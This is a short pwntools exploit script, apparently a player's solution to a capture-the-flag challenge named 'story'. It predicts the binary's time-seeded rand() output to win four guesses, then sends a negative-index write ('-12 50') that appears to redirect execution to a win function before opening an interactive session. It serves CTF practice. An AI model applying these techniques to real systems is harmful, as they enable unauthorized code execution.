#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template '--host=story.ctf.pragyan.org' '--port=6004' story
from pwn import *

# Import to predict rand() value
from ctypes import CDLL

# Set up pwntools for the correct architecture
exe = context.binary = ELF('story')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'story.ctf.pragyan.org'
port = int(args.PORT or 6004)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

# win add = 0x001014e6
# fun 0x4040
# hard_set_winner 0x164e
# 0x4010 -> 0x14b4 has to be 0x14e6

# -0x30/4, 50

io = start()

libc = CDLL("libc.so.6")
libc.srand(libc.time(0) // 0x3c)

for i in range(4):
    io.sendlineafter(b'guess', str(libc.rand() % 1000).encode())        

io.sendlineafter(b'game' ,b'ciao')
io.sendline(b'-12 50')


io.interactive()

